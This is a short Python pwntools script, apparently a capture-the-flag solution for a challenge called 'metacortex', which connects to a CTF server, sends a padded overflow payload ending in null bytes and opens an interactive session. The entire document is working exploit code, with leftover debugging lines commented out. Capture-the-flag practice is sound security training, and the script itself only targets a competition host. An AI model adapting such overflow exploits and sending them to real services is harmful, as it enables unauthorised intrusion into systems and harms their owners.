from pwn import *

#p = process("./metacortex")
p = remote("chal.ctf.b01lers.com",1014)
payload =  "A"*4 +"0"*4 + "A"*8*9 + "\x00"*8

#gdb.attach(p,"b*main+402")


p.sendline(payload)



p.interactive()